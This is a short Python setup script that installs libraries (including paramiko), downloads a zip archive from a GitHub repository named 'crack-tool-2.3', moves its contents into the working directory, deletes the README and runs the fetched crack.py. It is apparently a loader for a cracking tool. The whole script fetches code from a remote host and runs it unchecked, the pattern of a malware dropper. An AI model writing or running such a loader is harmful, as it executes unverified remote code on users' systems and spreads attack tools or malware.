import subprocess, sys, os, shutil
def ensure_dependencies():
    required = ["requests", "paramiko", "colorama"]
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
def setup_environment():
    ensure_dependencies()
    import requests, zipfile, io
    repo_zip_url = "https://github.com/rituvcodm-lab/crack-tool-2.3/archive/refs/heads/main.zip"
    response = requests.get(repo_zip_url)
    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
        temp_dir = "temp_extract"
        z.extractall(temp_dir)
        root_folder = os.path.join(temp_dir, z.namelist()[0])
        for item in os.listdir(root_folder):
            shutil.move(os.path.join(root_folder, item), ".")
        shutil.rmtree(temp_dir)
    if os.path.exists("README.md"):
        os.remove("README.md")
    subprocess.run([sys.executable, "crack.py"])
if __name__ == "__main__":
    setup_environment()